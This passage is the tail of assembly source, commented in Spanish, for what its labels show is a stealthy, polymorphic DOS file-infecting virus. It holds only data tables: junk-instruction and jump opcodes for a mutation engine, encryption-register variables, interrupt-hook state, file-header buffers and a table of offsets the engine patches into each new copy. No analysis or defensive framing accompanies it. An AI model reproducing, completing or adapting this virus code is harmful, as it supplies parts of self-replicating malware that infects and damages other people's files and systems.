   OpcodesInterrup DB  1Ch, 28h, 01h, 03h
   BasuraNoBanderas DB 0F5h, 0F8h, 0F9h, 0FBh, 0FCh, 0FDh, 90h, 3Eh
   ConAX       DB  98h, 27h, 2Fh, 37h, 3Fh, 90h, 9Fh, 0D7h
   Saltos      DB  75h, 79h, 7Dh, 7Fh, 75h, 78h, 7Ch, 7Eh
   BasuraInstruc   DB  02h, 0Ah, 12h, 1Ah, 22h, 2Ah, 32h, 3Ah, 84h, 8Ah
   FuncInterrup    DB  00, 12h, 0Fh, 10h, 88h, 15h, 01h, 16h, 02h, 16h
           DB  0Bh, 21h, 18h, 21h, 19h, 21h, 30h, 21h, 36h, 21h
           DB  51h, 21h, 54h, 21h, 58h, 21h
   Escritura   DB  0Ah
           DW  Offset AntInt21h - 200h
           DB  0
           DW  Offset SaltoCOM - 200h + 1
           DB  0
           DW  Offset Basura1 - 200h
           DB  0
           DW  Offset Basura2 - 200h
           DB  0
           DW  Offset Basura3 - 200h
           DB  0
           DW  Offset Basura4 - 200h
           DB  0
           DW  Offset Basura5 - 200h
           DB  0
           DW  Offset Basura6 - 200h
           DB  0
           DW  Offset Basura7 - 200h
           DB  0
           DW  Offset Basura8 - 200h
           DB  0
           DW  Offset Basura9 - 200h
           DB  0
           DW  Offset Basura10 - 200h
           DB  0
           DW  Offset Basura11 - 200h
           DB  0
           DW  Offset Basura12 - 200h
           DB  0
           DW  Offset Basura13 - 200h
           DB  0
           DW  Offset Basura14 - 200h
           DB  0
           DW  Offset Basura15 - 200h
           DB  0
           DW  Offset Basura16 - 200h
           DB  0
           DW  Offset Basura17 - 200h
           DB  8
           DW  Offset Atributos - 200h
           DB  3
           DW  Offset BytesInt24h - 200h
           DB  4
           DW  Offset WordAleatorio1 - 200h

           DB  0
   FinVirus    LABEL   WORD

   Ptr01       DD  0

   DirecDTA        DW  2 DUP (0)
   FakedHandle     DW  0
   EstadoInt24h        DB  0
   AntHandle       DW  0
   SumaNombre      DB  0
   NoStealth       DB  0
   PrimerByte      DB  0
   Cabecera        DB  18h DUP (0)
   Cabecera2       DB  18h DUP (0)
   RegistroEncriptado  DB  0
   RegistroIndice      DB  0
   RegistroContador    DB  0
   InicLoop        DW  0
   Temporal        DW  0
   TamanyoContador     DW  0
   IndiceInicial       DW  0
   SumaIndice      DW  0
   WordEncriptado      DW  0
   LongDesencrip       DW  0
   Estado          DB  0
   WordCambio      DW  0
   EstoyDentro     DB  0
   Banderas        DW  0
   Desinfeccion        DB  0
   InstalacionPoli     DB  0
   AntAleatorio        DW  3 DUP (0)

   LoopYaEsta      DB  0
   NumeroCALLs     db  0
   DirecCALLs      dw  08h dup (0)

   NewVirus    LABEL   WORD

           END Main
